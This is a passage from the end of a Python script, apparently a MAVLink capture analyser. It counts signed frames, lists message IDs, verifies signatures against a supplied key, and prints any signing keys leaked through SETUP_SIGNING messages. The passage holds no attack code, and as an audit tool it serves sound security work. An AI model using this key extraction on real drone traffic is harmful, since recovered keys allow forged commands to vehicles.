        got = parse_capture(args.capture)
    except (MavlinkError, OSError) as e:
        print(f"mavlink_link: {e}", file=sys.stderr)
        return 2
    frames = [f for _, f in got]
    signed = [f for f in frames if f.signed]
    print(f"{len(frames)} frames, {len(signed)} signed")
    ids = sorted({f.msgid for f in frames})
    print("msgids:", ", ".join(str(i) for i in ids))
    for leak in extract_setup_signing(frames):
        print(f"SETUP_SIGNING leak: key={leak.key_hex} target={leak.target_system}/{leak.target_component}")
    if args.key:
        key = bytes.fromhex(args.key)
        ok = sum(1 for f in signed if verify_signature(f, key))
        print(f"signature check: {ok}/{len(signed)} signed frames verify with the given key")
    return 0


if __name__ == "__main__":
    sys.exit(_main(sys.argv[1:]))
